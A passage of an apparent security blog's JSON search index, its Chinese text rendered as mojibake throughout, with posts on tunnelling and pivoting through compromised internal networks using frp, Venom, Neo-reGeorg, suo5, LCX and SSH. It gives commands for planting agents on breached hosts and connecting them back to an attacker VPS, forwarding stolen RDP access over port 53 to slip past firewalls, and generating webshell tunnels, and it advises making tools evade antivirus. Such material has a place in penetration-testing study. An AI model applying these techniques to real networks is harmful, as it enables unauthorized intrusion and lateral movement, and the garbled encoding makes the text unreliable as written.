£æ¥ä¸æ•æ„Ÿç«¯å£é€šä¿¡\nç«¯å£æ˜ å°„ï¼šæ˜¯NATçš„ä¸€ç§ï¼ŒåŠŸèƒ½æ˜¯æŠŠåœ¨å…¬ç½‘çš„åœ°å€è½¬æˆç§æœ‰åœ°å€ã€‚ç®€å•æ¥è¯´å°±æ˜¯å°†ä¸€ä¸ªç«¯å£æ˜ å°„åˆ°å¦ä¸€ä¸ªç«¯å£ï¼Œæ›´é€‚ç”¨äºæè¿°å¤–ç½‘è·¯ç”±å™¨ï¼ˆè€Œä¸æ˜¯å¤–ç½‘ä¸»æœºï¼‰æ˜ å°„è‡³å†…ç½‘ä¸»æœº\nHTTPä»£ç†å’Œsocksä»£ç† httpä»£ç†ç”¨çš„æ˜¯httpåè®®ï¼Œå·¥ä½œåœ¨åº”ç”¨å±‚ï¼Œä¸»è¦æ˜¯ç”¨æ¥ä»£ç†æµè§ˆå™¨è®¿é—®ç½‘é¡µ socksä»£ç†ç”¨çš„æ˜¯socksåè®®ï¼Œæ ‡å‡†ç«¯å£ä¸º1080ï¼Œå·¥ä½œåœ¨ä¼šè¯å±‚ï¼Œä¸»è¦ç”¨æ¥ä¼ é€’æ•°æ®åŒ…ã€‚socksä»£ç†æœ‰socks4å’Œsocks5ä¸¤ä¸ªç‰ˆæœ¬ï¼Œsocks4åªæ”¯æŒTCPï¼Œsocks5æ”¯æŒUDPã€TCPç­‰åè®®ã€‚åœ¨å†…ç½‘æ¸—é€ä¸­ï¼Œé€šè¿‡æ­å»ºsocksä»£ç†ï¼Œå¯ä»¥æ— éœ€è¿›è¡Œå¤šæ¬¡ç«¯å£è½¬å‘ï¼Œè¾¾åˆ°ä¸ç›®æ ‡å†…ç½‘ä¸»æœºè¿›è¡Œé€šä¿¡çš„ç›®çš„ "
    }
,
    {
        "title": "éš§é“ä»£ç†-åº”ç”¨å±‚å†…ç½‘ä»£ç†",
        "link": "/My-Knowlege-Database/blog/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E9%9A%A7%E9%81%93%E4%BB%A3%E7%90%86%E6%8A%80%E6%9C%AF/%E9%9A%A7%E9%81%93%E4%BB%A3%E7%90%86-%E5%BA%94%E7%94%A8%E5%B1%82%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86/",
        "content": "éš§é“ä»£ç†-åº”ç”¨å±‚å†…ç½‘ä»£ç† å†…ç½‘ä»£ç†æŠ€æœ¯ä¸€èˆ¬é‡‡ç”¨httpæˆ–è€…socksä»£ç†\nå¸‚é¢ä¸Šçš„å·¥å…·å¾ˆå¤šï¼Œè¿™é‡Œå’¨è¯¢äº†ä¸‹å¤§ä½¬ï¼Œå°±æš‚æ—¶å…ˆå­¦ä¹ å‡ ä¸ªå¸¸ç”¨çš„ï¼š\nfrp suo5 neo-regeorg ï¼ˆDaac0ngå¸ˆå‚…è¯´å…¶å®å¾ˆå¤šæƒ…å†µç›´æ¥ç”¨c2å¼€ä¸€ä¸ªéš§é“ï¼Œç„¶åproxifierä»£ç†ä¸€ä¸‹å°±å¥½äº†ï¼‰\nfrp ä¸€ä¸ªä¸“æ³¨äºå†…ç½‘ç©¿é€çš„é«˜æ€§èƒ½åå‘ä»£ç†å·¥å…·ï¼Œæ”¯æŒTCPã€UDPã€HTTPã€HTTPSç­‰åè®®\nåœ¨å†…ç½‘æ¸—é€ä¸­ï¼Œfrpå¯ä»¥ç”¨æ¥è¿›è¡Œå†…ç½‘éš§é“æ­å»ºï¼Œå¦å¤–frpä¹Ÿæ”¯æŒæ­å»ºsocks5ä»£ç†åº”ç”¨\nfrpåˆ†ä¸ºwindowså’Œlinuxç³»ç»Ÿä¸¤ä¸ªç‰ˆæœ¬ï¼Œä¸»è¦åŒ…å«è¿™äº›æ–‡ä»¶ï¼š\nfrpsï¼šæœåŠ¡ç«¯ç¨‹åº frps.iniï¼šæœåŠ¡ç«¯é…ç½®æ–‡ä»¶ frpcï¼šå®¢æˆ·ç«¯æ–‡ä»¶ frpcï¼šå®¢æˆ·ç«¯é…ç½®æ–‡ä»¶ ä½¿ç”¨æ—¶ï¼Œå°† frps åŠ frps.ini æ”¾åˆ°å…·æœ‰å…¬ç½‘ IP çš„æœºå™¨ä¸Šï¼Œå°† frpc åŠ frpc.ini æ”¾åˆ°å¤„äºå†…ç½‘ç¯å¢ƒçš„æœºå™¨ä¸Š\næœåŠ¡ç«¯é…ç½®ï¼ˆfrpsï¼‰ é…ç½®æ–‡ä»¶å†…å®¹ï¼š\n[common] bind_port = 7000 # é»˜è®¤é…ç½®ä¸­ç›‘å¬7000ç«¯å£ï¼Œå¯æ ¹æ®å®é™…æƒ…å†µä¿®æ”¹ å¯åŠ¨ä»£ç†æ–‡ä»¶ï¼š\n./frps -c ./frps.ini å®¢æˆ·ç«¯é…ç½®ï¼ˆfrpcï¼‰ å‡è®¾ FRP æœåŠ¡ç«¯æ‰€åœ¨ä¸»æœºçš„å…¬ç½‘ IP ä¸º x.x.x.x\né…ç½®æ–‡ä»¶å†…å®¹ï¼š\n[common] server_addr = x.x.x.x server_port = 7000 å¯åŠ¨æ–‡ä»¶ï¼š\n./frpc -c ./frpc.ini é…ç½®æ–‡ä»¶å…¶ä»–åŠŸèƒ½ é…ç½®æ–‡ä»¶éå¸¸é‡è¦ï¼Œéœ€è¦ä»€ä¹ˆåŠŸèƒ½å°±å¯ä»¥è¿›è¡Œä¸åŒçš„é…ç½®ï¼Œæ¥è¿›è¡Œä»£ç†\nå‚è€ƒæ–‡æ¡£ï¼šå‚è€ƒ | frp (gofrp.org)\næ­å»ºåœºæ™¯ ç«¯å£è½¬å‘ å°†å†…ç½‘ç«¯å£ï¼ˆè¿™é‡Œä»¥3389ä¸ºä¾‹ï¼‰è½¬å‘åˆ°å…¬ç½‘\nå®¢æˆ·ç«¯é…ç½®ï¼š\n[common] bind_port = 7000 æœåŠ¡ç«¯é…ç½®ï¼š\n[common] server_addr = x.x.x.x server_port = 7000 [3389] type = tcp local_ip = 127.0.0.1 local_port = 3389 remote_port = 6000 å¦‚æ­¤å¯ä»¥å®ç°RDPè¿æ¥\næ­å»ºsockséš§é“ æ­å»ºå®ç°å¯¹ç›®æ ‡ä¸»æœºçš„å…¨ç«¯å£è®¿é—®\nå®¢æˆ·ç«¯é…ç½®ï¼š\n[common] bind_port = 7000 æœåŠ¡ç«¯é…ç½®ï¼š\n[common] server_addr = x.x.x.x server_port = 7000 [socks5] type = tcp plugin = socks5 remote_port = 6000 ç”¨proxifierä»£ç†åˆ°x.x.x.xçš„6000ç«¯å£ï¼Œå¦‚æ­¤å³å¯å®ç°å…¨ç«¯å£è®¿é—®\næ­å»ºsockså¤šçº§éš§é“ æ­å»ºå¤šçº§éš§é“ï¼š\nä¸»æœºAé…ç½®æœåŠ¡ç«¯ï¼š\n[common] server_addr = 192.168.X.X server_port = 7001 [socks5] type = tcp plugin = socks5 remote_port = 6000 ä¸»æœºBé…ç½®å®¢æˆ·ç«¯ï¼š\n[common] bind_port = 7001 è¿™é‡Œæ­å»ºäº†ä¸€ä¸ªéš§é“å†…ç½‘ï¼Œæ¥ä¸‹æ¥æ˜¯ç«¯å£è½¬å‘ï¼š\nä¸»æœºBä¸Šé…ç½®æœåŠ¡ç«¯\n[common] server_addr = x.x.x.x server_port = 7000 [portforward] type = tcp local_ip = 127.0.0.1 remote_port = 6000 local_port = 6000 ä¸»æœºCä¸Šé…ç½®å®¢æˆ·ç«¯ï¼š\n[common] bind_port = 7000 å¦‚æ­¤ï¼Œé€šè¿‡proxifierä»£ç†x.x.x.x:6000å³å¯å®ç°å¤šçº§ä»£ç†\nVenom è¿™æ˜¯ä¸€æ¬¾ä½¿ç”¨Goå¼€å‘çš„å¤šçº§ä»£ç†å·¥å…·\næ¯”èµ·frpï¼Œæˆ‘æ›´å–œæ¬¢venomï¼Œä»–æ›´åŠ çš„ç®€ä¾¿é«˜æ•ˆï¼Œè€Œä¸”ä¸éœ€è¦å¯ä»¥ä¸¥æ ¼è€ƒè™‘æ­£åå‘è¿æ¥ï¼Œç¼ºç‚¹æ˜¯ç‰¹å¾æ¯”è¾ƒæ˜æ˜¾\nä½¿ç”¨ï¼ˆå¤šå±‚ä»£ç†ï¼‰ venomä¹Ÿæœ‰adminèŠ‚ç‚¹å’ŒagentèŠ‚ç‚¹ï¼Œä¸¤ä¸ªèŠ‚ç‚¹å‡å¯ç›‘å¬è¿æ¥ä¹Ÿå¯å‘èµ·è¿æ¥ï¼š\nadminç›‘å¬ç«¯å£ï¼Œagentå‘èµ·è¿æ¥: ./admin_linux_x64 -lport 4445 -passwd yuy0ung ./agent_linux_x64 -rhost [vps-ip] -rport 9999 -passwd yuy0ung agentç›‘å¬ç«¯å£ï¼Œadminå‘èµ·è¿æ¥: ./agent_linux_x64 -lport 4445 -passwd yuy0ung ./admin_linux_x64 -rhost [host-ip] -rport 8888 -passwd yuy0ung è¿™é‡Œç›´æ¥æ¨¡æ‹Ÿä¸€ä¸ªå¤šå±‚ä»£ç†åœºæ™¯ï¼š\nkaliï¼ˆæ¨¡æ‹Ÿæˆ‘çš„vpsï¼‰ win10ï¼ˆå¤–ç½‘ä¸»æœºclient01ï¼‰ win10ï¼ˆåŸŸæˆå‘˜ä¸»æœºclient02ï¼‰ win server 2019 ï¼ˆDCï¼‰ æ¥ä¸‹æ¥æˆ‘å°è¯•é€šè¿‡æ­å»ºvpsåˆ°client01ã€client01åˆ°client02çš„ä¸¤å±‚ä»£ç†\nç¬¬ä¸€å±‚ agentèŠ‚ç‚¹\né¦–å…ˆè·å–åˆ°client01çš„æƒé™ï¼Œä¸Šä¼ venomçš„agentç«¯ï¼Œæ‰§è¡Œå‘½ä»¤åå‘è¿æ¥adminï¼š\nagent.exe -rhost -rport 4445 -passwd yuy0ung adminèŠ‚ç‚¹\nvpsä¸Šå¼€å¯adminèŠ‚ç‚¹ç›‘å¬\n./admin_linux_x64 -lport 4445 -passwd yuy0ung ç¬¬ä¸€ä¸ªèŠ‚ç‚¹ä¸Šçº¿æˆåŠŸï¼Œä½¿ç”¨showè·å–æ‹“æ‰‘ï¼Œè¿™é‡Œå¯ä»¥çœ‹è§ä¸€ä¸ªèŠ‚ç‚¹ï¼š\né€šè¿‡gotoè¿›å…¥ç›®æ ‡èŠ‚ç‚¹ï¼š helpå¯ä»¥æŸ¥çœ‹å‘½ä»¤ï¼š\nä¸€èˆ¬å¸¸ç”¨çš„å°±æ˜¯socks5ä»£ç†ï¼š\nsocks 7777 è®¾ç½®socksä»£ç†æˆåŠŸåå¯é€šè¿‡åœ¨æµè§ˆå™¨é…ç½®ä»£ç†æˆ–è€…proxifieræˆ–è€…é…ç½®proxychains4å·¥å…·è®¿é—®å…¶ä»–ç«¯å£æœåŠ¡\nç¬¬äºŒå±‚ åœ¨ç¬¬ä¸€ä¸ªèŠ‚ç‚¹ä¸Šç›‘å¬ä¸€ä¸ªç«¯å£ï¼š\nlisten 4446 æ¥ä¸‹æ¥è·å–client02ä¸»æœºçš„shellï¼Œä¸Šä¼ agentï¼Œåå‘è¿æ¥èŠ‚ç‚¹ä¸€ï¼š\nagent.exe -rhost 192.168.111.137 -rport 4446 -passwd yuy0ung è¿æ¥æˆåŠŸï¼ŒæŸ¥çœ‹èŠ‚ç‚¹ï¼š\nåŒç†ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥åœ¨èŠ‚ç‚¹2ä¸Šå¼€å¯socksä»£ç†ï¼š\nè‡³æ­¤ï¼Œæˆ‘ä»¬å®Œæˆäº†ä¸¤å±‚ä»£ç†çš„æ­å»º\nNeo-reGeorg githubåœ°å€ï¼šNeo-reGeorg\nä»‹ç» Neo-reGeorgæ˜¯ä¸€ä¸ªHTTPæ­£å‘éš§é“å·¥å…·ï¼Œæ˜¯reGeorgçš„ä¸€ä¸ªé‡æ„å‡çº§é¡¹ç›®ï¼ŒNeo-reGeorgç›¸å¯¹äºreGeorgå¢åŠ äº†å¾ˆå¤šç‰¹æ€§ï¼Œä¾‹å¦‚åƒå†…å®¹åŠ å¯†ã€é¿å…è¢«æ£€æµ‹ã€è¯·æ±‚å¤´å®šåˆ¶ã€å“åº”ç å®šåˆ¶ã€æ”¯æŒpy3ç­‰ç­‰\näº†è§£åˆ°è¿™ä¸ªå·¥å…·æ˜¯å› ä¸ºuu2å¸ˆå‚…é—®äº†æˆ‘ä¸€ä¸ªåœºæ™¯é—®é¢˜ï¼š\nä½ æ‹¿äº†æœºå™¨shellï¼Œåªæœ‰80ç«¯å£å…¥ç½‘å‡ºç½‘ï¼Œ80ç«¯å£è¿˜è¢«å ç”¨ä¸èƒ½frpä½ æ€ä¹ˆåŠ\né‚£ä¹ˆè¿™é‡Œå½“ç„¶åªèƒ½æƒ³åŠæ³•ä»80ç«¯å£æ­httpéš§é“ï¼Œè€Œåˆä¸èƒ½å½±å“webæœåŠ¡ï¼Œé‚£ä¹ˆå°±æƒ³åˆ°äº†åŸºäºwebshellè¿›è¡Œæ­å»ºï¼Œäºæ˜¯ä¾¿äº†è§£åˆ°ä¸¤æ¬¾å¥½ç”¨çš„ä»£ç†å·¥å…·ï¼šneo-rgeorgã€suo5\nåŸç† å¼•ç”¨ä¸€å¼ å›¾ï¼Œéå¸¸ç²¾è¾Ÿï¼š\nå³å°†socksä»£ç†æ•°æ®åŒ…è£¹åœ¨httpåè®®é‡Œè¾¹\nä½¿ç”¨ ç”Ÿæˆwebshell Neo-reGeorgç”Ÿæˆwebshellï¼Œè¿™é‡Œç”Ÿæˆçš„å¯†é’¥æ˜¯åç»­è¿æ¥ä½¿ç”¨çš„ï¼Œé˜²æ­¢è¢«å…¶ä»–æ”»å‡»è€…åˆ©ç”¨\npython neoreg.py generate -k \u0026lt;æŒ‡å®šå¯†é’¥\u0026gt; ä¸Šä¼ webshellå¹¶è¿æ¥ ä½¿ç”¨neoregè¿æ¥ç›®æ ‡è„šæœ¬æ–‡ä»¶ï¼ˆ-pæŒ‡å®šç«¯å£ï¼Œé»˜è®¤ä¸º1080ï¼‰\npython neoreg.py -k \u0026lt;å·²ç»è®¾å®šçš„å¯†é’¥\u0026gt; -u \u0026lt;http://xxx.xxx.xxx/tunnel.aspx\u0026gt; -p \u0026lt;prot\u0026gt; é…åˆproxifierè¿›è¡Œæµé‡è½¬å‘ ä»£ç†åœ°å€ä¸º127.0.0.1ï¼Œç«¯å£ä¸ºNeo-reGeorgè½¬å‘çš„ç«¯å£åœ°å€ï¼Œåè®®é€‰æ‹©socks5ï¼Œå³å¯å®ç°httpæ­£å‘ä»£ç†\nNeo-reGeorgçš„é€Ÿåº¦å’Œç¨³å®šæ€§ä¸€èˆ¬ï¼Œå¹¶ä¸”æœ‰ä¸ªæ¯”è¾ƒå¤§çš„é—®é¢˜æ˜¯æ— æ³•åœ¨åå‘ä»£ç†çš„åœºæ™¯ä½¿ç”¨ï¼Œæœ€å¸¸è§çš„ Nginx + Tomcat çš„åœºæ™¯å°±æ— æ³•ä½¿ç”¨ï¼Œè¿™é‡Œä¾¿å¼•å‡ºä¸€ä¸ªæ›´å¥½çš„webshellæ­£å‘ä»£ç†å·¥å…·ï¼šsuo5\nsuo5 githubåœ°å€ï¼šsuo5: ä¸€æ¬¾é«˜æ€§èƒ½ HTTP ä»£ç†éš§é“å·¥å…· suo5 æ˜¯ä¸€ä¸ªé«˜æ€§èƒ½ HTTP éš§é“ä»£ç†å·¥å…·ï¼Œå®ƒåŸºäºåŒå‘çš„ Chunked-Encoding æ„å»º, ç›¸æ¯” Neo-reGeorg ç­‰ä¼ ç»Ÿéš§é“å·¥å…·, suo5 çš„æ€§èƒ½å¯ä»¥è¾¾åˆ°å…¶æ•°åå€\nåŸç†ä»‹ç» https://koalr.me/posts/suo5-a-hign-performace-http-socks/\nå¦‚æœç›®æ ‡æ˜¯ Java çš„ç«™ç‚¹ï¼Œå¯ä»¥ä½¿ç”¨ suo5 æ¥æ„å»º http éš§é“ï¼Œå¤§å¤šæ•°æƒ…å†µä¸‹ suo5 éƒ½è¦æ¯” neo æ›´ç¨³å®šé€Ÿåº¦æ›´å¿«ã€‚ä½† neo æä¾›äº†éå¸¸å¤šç§ç±»çš„æœåŠ¡ç«¯æ”¯æŒï¼Œå…¼å®¹æ€§å¾ˆå¥½ï¼Œè€Œä¸”ä¹Ÿæ”¯æŒä¸€äº› suo5 å½“å‰è¿˜åœ¨å¼€å‘çš„åŠŸèƒ½ï¼Œä¹Ÿæ”¯æŒæ›´çµæ´»çš„å®šåˆ¶åŒ–\nå…·ä½“çš„ä½¿ç”¨ä¸åœ¨èµ˜è¿°ï¼Œå‚è€ƒgithubå³å¯\n",
        "summary": "éš§é“ä»£ç†-åº”ç”¨å±‚å†…ç½‘ä»£ç† å†…ç½‘ä»£ç†æŠ€æœ¯ä¸€èˆ¬é‡‡ç”¨httpæˆ–è€…socksä»£ç†\nå¸‚é¢ä¸Šçš„å·¥å…·å¾ˆå¤šï¼Œè¿™é‡Œå’¨è¯¢äº†ä¸‹å¤§ä½¬ï¼Œå°±æš‚æ—¶å…ˆå­¦ä¹ å‡ ä¸ªå¸¸ç”¨çš„ï¼š\nfrp suo5 neo-regeorg ï¼ˆDaac0ngå¸ˆå‚…è¯´å…¶å®å¾ˆå¤šæƒ…å†µç›´æ¥ç”¨c2å¼€ä¸€ä¸ªéš§é“ï¼Œç„¶åproxifierä»£ç†ä¸€ä¸‹å°±å¥½äº†ï¼‰\nfrp ä¸€ä¸ªä¸“æ³¨äºå†…ç½‘ç©¿é€çš„é«˜æ€§èƒ½åå‘ä»£ç†å·¥å…·ï¼Œæ”¯æŒTCPã€UDPã€HTTPã€HTTPSç­‰åè®®\nåœ¨å†…ç½‘æ¸—é€ä¸­ï¼Œfrpå¯ä»¥ç”¨æ¥è¿›è¡Œå†…ç½‘éš§é“æ­å»ºï¼Œå¦å¤–frpä¹Ÿæ”¯æŒæ­å»ºsocks5ä»£ç†åº”ç”¨\nfrpåˆ†ä¸ºwindowså’Œlinuxç³»ç»Ÿä¸¤ä¸ªç‰ˆæœ¬ï¼Œä¸»è¦åŒ…å«è¿™äº›æ–‡ä»¶ï¼š\nfrpsï¼šæœåŠ¡ç«¯ç¨‹åº frps.iniï¼šæœåŠ¡ç«¯é…ç½®æ–‡ä»¶ frpcï¼šå®¢æˆ·ç«¯æ–‡ä»¶ frpcï¼šå®¢æˆ·ç«¯é…ç½®æ–‡ä»¶ ä½¿ç”¨æ—¶ï¼Œå°† frps åŠ frps.ini æ”¾åˆ°å…·æœ‰å…¬ç½‘ IP çš„æœºå™¨ä¸Šï¼Œå°† frpc åŠ frpc.ini æ”¾åˆ°å¤„äºå†…ç½‘ç¯å¢ƒçš„æœºå™¨ä¸Š\næœåŠ¡ç«¯é…ç½®ï¼ˆfrpsï¼‰ é…ç½®æ–‡ä»¶å†…å®¹ï¼š\n[common] bind_port = 7000 # é»˜è®¤é…ç½®ä¸­ç›‘å¬7000ç«¯å£ï¼Œå¯æ ¹æ®å®é™…æƒ…å†µä¿®æ”¹ å¯åŠ¨ä»£ç†æ–‡ä»¶ï¼š\n./frps -c ./frps.ini å®¢æˆ·ç«¯é…ç½®ï¼ˆfrpcï¼‰ å‡è®¾ FRP æœåŠ¡ç«¯æ‰€åœ¨ä¸»æœºçš„å…¬ç½‘ IP ä¸º x.x.x.x\né…ç½®æ–‡ä»¶å†…å®¹ï¼š\n[common] server_addr = x.x.x.x server_port = 7000 å¯åŠ¨æ–‡ä»¶ï¼š\n./frpc -c ./frpc.ini é…ç½®æ–‡ä»¶å…¶ä»–åŠŸèƒ½ é…ç½®æ–‡ä»¶éå¸¸é‡è¦ï¼Œéœ€è¦ä»€ä¹ˆåŠŸèƒ½å°±å¯ä»¥è¿›è¡Œä¸åŒçš„é…ç½®ï¼Œæ¥è¿›è¡Œä»£ç†\nå‚è€ƒæ–‡æ¡£ï¼šå‚è€ƒ | frp (gofrp.org)\næ­å»ºåœºæ™¯ ç«¯å£è½¬å‘ å°†å†…ç½‘ç«¯å£ï¼ˆè¿™é‡Œä»¥3389ä¸ºä¾‹ï¼‰è½¬å‘åˆ°å…¬ç½‘\nå®¢æˆ·ç«¯é…ç½®ï¼š\n[common] bind_port = 7000 æœåŠ¡ç«¯é…ç½®ï¼š\n[common] server_addr = x.x.x.x server_port = 7000 [3389] type = tcp local_ip = 127.0.0.1 local_port = 3389 remote_port = 6000 å¦‚æ­¤å¯ä»¥å®ç°RDPè¿æ¥\n"
    }
,
    {
        "title": "éš§é“ä»£ç†-ç«¯å£è½¬å‘ç›¸å…³å·¥å…·",
        "link": "/My-Knowlege-Database/blog/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E9%9A%A7%E9%81%93%E4%BB%A3%E7%90%86%E6%8A%80%E6%9C%AF/%E9%9A%A7%E9%81%93%E4%BB%A3%E7%90%86-%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E7%9B%B8%E5%85%B3%E5%B7%A5%E5%85%B7/",
        "content": "éš§é“ä»£ç†-ç«¯å£è½¬å‘ç›¸å…³å·¥å…· LCX LCXæ˜¯ä¸€æ¬¾å†…ç½‘ç«¯å£è½¬å‘å·¥å…·ï¼Œåˆ†ä¸ºWindowsç‰ˆå’ŒLinuxç‰ˆï¼ŒLinuxç‰ˆæœ¬ä¸ºPortMapã€‚LCXæœ‰ç«¯å£æ˜ å°„å’Œç«¯å£è½¬å‘ä¸¤å¤§åŠŸèƒ½ï¼Œä¾‹å¦‚ï¼šå½“ç›®æ ‡çš„3389ç«¯å£åªå¯¹å†…å¼€æ”¾è€Œä¸å¯¹å¤–å¼€æ”¾æ—¶ï¼Œå¯ä»¥ä½¿ç”¨ç«¯å£æ˜ å°„å°†3389ç«¯å£æ˜ å°„åˆ°ç›®æ ‡çš„å…¶ä»–ç«¯å£ä½¿ç”¨ï¼›å½“ç›®æ ‡å¤„äºå†…ç½‘æˆ–ç›®æ ‡é…ç½®çš„ç­–ç•¥åªå…è®¸è®¿é—®æŸä¸€å›ºå®šç«¯å£æ—¶ï¼Œå¯ä»¥é€šè¿‡ç«¯å£è½¬å‘çªç ´é™åˆ¶\nç›®å‰å¾ˆå¤šæ€è½¯å·²ç»å°†LCXåŠ å…¥äº†ç‰¹å¾åº“ï¼Œæ‰€ä»¥åœ¨å®é™…åˆ©ç”¨æ—¶éœ€è¦è‡ªè¡Œåšå…æ€å¤„ç†\nWindowsç‰ˆçš„LCXç”¨æ³•ï¼š Usage:lcx.exe -\u0026lt;listen|tran|slave\u0026gt; \u0026lt;option\u0026gt; [-log logfile] -tran \u0026lt;ç­‰å¾…è¿æ¥çš„ç«¯å£\u0026gt; \u0026lt;ç›®æ ‡ip\u0026gt; \u0026lt;ç›®æ ‡ç«¯å£\u0026gt; (ç«¯å£æ˜ å°„) -listen \u0026lt;ç›‘å¬slaveè¯·æ±‚çš„ç«¯å£(å¯¹åº”slave çš„ç¬¬äºŒä¸ªå‚æ•°)\u0026gt; \u0026lt;ç­‰å¾…è¿æ¥çš„ç«¯å£\u0026gt; (ç«¯å£è½¬å‘) -slave \u0026lt;ä½ çš„ip\u0026gt; \u0026lt;ç›‘å¬ç«¯å£(å¯¹åº”listençš„ç¬¬ä¸€ä¸ªå‚æ•°)\u0026gt; \u0026lt;ç›®æ ‡ip\u0026gt; \u0026lt;ç›®æ ‡ç«¯å£\u0026gt; (ç«¯å£è½¬å‘) Linuxç‰ˆçš„LCXç”¨æ³•ï¼š linuxä¸‹çš„å·¥å…·åä¸ºportmap\nUsage:./portmap -m method [-h1 host1] -p1 port1 [-h2 host2] -p2 port2 [-v] [-log filename] -v: version -h1: host1 -h2: host2 -p1: port1 -p2: port2 -log: log the data -m: the action method for this tool 1: listen on PORT1 and connect to HOST2:PORT2 2: listen on PORT1 and PORT2 3: connect to HOST1:PORT1 and HOST2:PORT2 ä½¿ç”¨æ¡ˆä¾‹ ç›®æ ‡æœºæœ‰å…¬ç½‘IPï¼š\nå·²è·å–windowsä¸»æœºçš„shellï¼Œä¸Šçº¿CSï¼Œä¸”å·²æŠ“å–åˆ°è´¦æˆ·å¯†ç ï¼Œå¼€å¯äº†3389ä½†RDPè¿œè¿å¤±è´¥ï¼Œæ¨æµ‹å¯èƒ½è¢«é˜²ç«å¢™æ‹¦äº†ï¼Œæ­¤æ—¶å¯ä»¥ä½¿ç”¨lcxè¿›è¡Œç«¯å£è½¬å‘ï¼š\nå°†LCXä¸Šä¼ è‡³windowsä¸»æœº\nåœ¨æ”»å‡»æœºä¸Šæ‰§è¡Œå‘½ä»¤ï¼š\nlcx.exe -listen 53 1111 #ç›‘å¬æœ¬åœ°53ç«¯å£å¹¶è½¬å‘åˆ°æœ¬åœ°1111ç«¯å£ï¼Œè¿™é‡Œé€‰æ‹©53æ˜¯å› ä¸ºDNSç«¯å£ä¸€èˆ¬ä¸ä¼šè¢«ban åœ¨CSçš„windows shellä¸Šæ‰§è¡Œï¼š\nlcx.exe -slave [æ”»å‡»æœºIP] 53 127.0.0.1 3389 #å°†æœ¬æœº3389ç«¯å£è½¬å‘åˆ°æ”»å‡»æœºçš„53ç«¯å£ RDPè¿æ¥ï¼š127.0.0.1:1111ï¼Œå³å¯æˆåŠŸè¿æ¥è¢«æ”»å‡»windowsä¸»æœºçš„è¿œç¨‹æ¡Œé¢ï¼Œä¸”æœªè¢«é˜²ç«å¢™æ‹¦æˆª\nç›®æ ‡æœºæ— å…¬ç½‘IPï¼š\nå·²è·å–å†…ç½‘windowsä¸»æœºçš„shellï¼Œä¸Šçº¿CSï¼Œä¸”å·²æŠ“å–åˆ°è´¦æˆ·å¯†ç ï¼Œå¼€å¯äº†3389ï¼Œä½†å†…ç½‘ä¸»æœºæ— æ³•ç›´æ¥RDPè¿œè¿ï¼Œæ­¤æ—¶ä¹Ÿå¯ä»¥ä½¿ç”¨lcxï¼Œé…åˆå…¬ç½‘vpsè¿›è¡Œç«¯å£è½¬å‘ï¼š\nå°†LCXä¸Šä¼ è‡³windowsä¸»æœº\nåœ¨å…¬ç½‘vpsä¸Šä½¿ç”¨lcxï¼š\n./portmap -m 2 -p1 54 -p2 1111 åœ¨CSçš„windows shellä¸Šæ‰§è¡Œ:\nshell lcx.exe -slave [vpså…¬ç½‘IP] 54 127.0.0.1 3389 RDPè¿æ¥ï¼š[vpså…¬ç½‘IP]:1111ï¼Œå³å¯æˆåŠŸè¿æ¥è¢«æ”»å‡»windowsä¸»æœºçš„è¿œç¨‹æ¡Œé¢\nç«¯å£æ˜ å°„ï¼š\næœ‰å¦‚ä¸‹æ‹“æ‰‘ï¼š\nè·å–å¤–ç½‘ä¸»æœºshellåï¼Œå‘ç°å†…ç½‘å­˜åœ¨ä¸€å°MySQLæœåŠ¡å™¨ï¼Œä¸”å·²æ”¶é›†åˆ°MySQLæœåŠ¡å™¨çš„SSHç™»å½•å‡­è¯ï¼Œç”±äºå…¶å¤„äºå†…ç½‘æ— æ³•ç›´æ¥SSHè¿æ¥ï¼Œæ‰€ä»¥è€ƒè™‘ä½¿ç”¨LCXå°†MySQLçš„22ç«¯å£æ˜ å°„åˆ°WEBæœåŠ¡å™¨ä¸Š\nåœ¨webæœåŠ¡å™¨ä¸Šæ‰§è¡Œå‘½ä»¤ï¼š\nlcx.exe -tran 2222 [MySQLæœåŠ¡å™¨å†…ç½‘IP] 22 ç»è¿‡ç«¯å£æ˜ å°„ï¼Œå³å¯ç›´æ¥SSHè¿æ¥MySQLï¼š\nssh root@[WEBæœåŠ¡å™¨IP] -p 2222 SSH sshæ˜¯linuxä¸»æœºè‡ªå¸¦çš„ç¨‹åºï¼Œæ”»å‡»è€…æ— éœ€ä¸Šä¼ ç¬¬ä¸‰æ–¹å·¥å…·å³å¯å®ç°ç«¯å£è½¬å‘ï¼Œè¿™ä½¿å¾—sshçš„ä½¿ç”¨æ›´åŠ æ–¹ä¾¿\nsshé€šè¿‡è¿œç¨‹è®¿é—®ä¸»æœºæä¾›ä¿æŠ¤ï¼Œå¯ä»¥å¯¹å®¢æˆ·ç«¯å’ŒæœåŠ¡ç«¯ä¹‹é—´çš„æ•°æ®ä¼ è¾“è¿›è¡Œå‹ç¼©å’ŒåŠ å¯†ï¼Œæœ‰èº«ä»½éªŒè¯ã€SCPã€SFTPã€ç«¯å£è½¬å‘ç­‰åŠŸèƒ½\nå¸¸ç”¨å‚æ•° -cï¼šè¯·æ±‚å‹ç¼©æ‰€æœ‰æ•°æ® -Dï¼šåŠ¨æ€è½¬å‘ï¼ˆç±»ä¼¼socksä»£ç†ï¼‰ -fï¼šåå°æ‰§è¡ŒSSHæŒ‡ä»¤ -gï¼šå…è®¸è¿œç¨‹ä¸»æœºè¿æ¥ä¸»æœºçš„è½¬å‘ç«¯å£ -Lï¼šæœ¬åœ°è½¬å‘ï¼ˆå¯ç†è§£ä¸ºæ­£å‘ï¼‰ -Nï¼šä¸æ‰§è¡Œè¿œç¨‹æŒ‡ä»¤ï¼Œå¤„äºç­‰å¾…æ¨¡å¼ -Rï¼šè¿œç¨‹è½¬å‘ï¼ˆå¯ç†è§£ä¸ºåå‘ï¼‰ è¿™é‡Œä»…å¯¹ç«¯å£è½¬å‘ï¼ˆæœ¬åœ°å’Œè¿œç¨‹è½¬å‘ï¼‰åŠŸèƒ½è¿›è¡Œä»‹ç»\næœ¬åœ°è½¬å‘ï¼ˆæ­£å‘ï¼‰ æœ‰å¦‚ä¸‹åœºæ™¯ï¼Œå¤–ç½‘linuxä¸»æœºå·²ç»getshellï¼Œå·²çŸ¥å†…ç½‘windowsä¸»æœºçš„3389å¼€å¯ä¸”å·²è·å¾—å†…ç½‘ä¸»æœºçš„è´¦æˆ·å¯†ç 